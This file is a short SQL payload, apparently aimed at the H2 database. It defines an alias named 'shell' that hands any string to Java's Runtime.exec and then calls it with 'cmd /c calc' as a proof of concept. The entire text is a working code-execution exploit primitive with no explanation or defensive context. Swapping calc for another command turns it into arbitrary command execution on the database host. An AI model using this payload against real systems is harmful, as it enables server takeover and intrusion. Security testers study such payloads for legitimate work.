DROP ALIAS IF EXISTS shell;
CREATE ALIAS shell AS $$void shell(String s) throws Exception {
	java.lang.Runtime.getRuntime().exec(s);
}$$;
SELECT shell('cmd /c calc');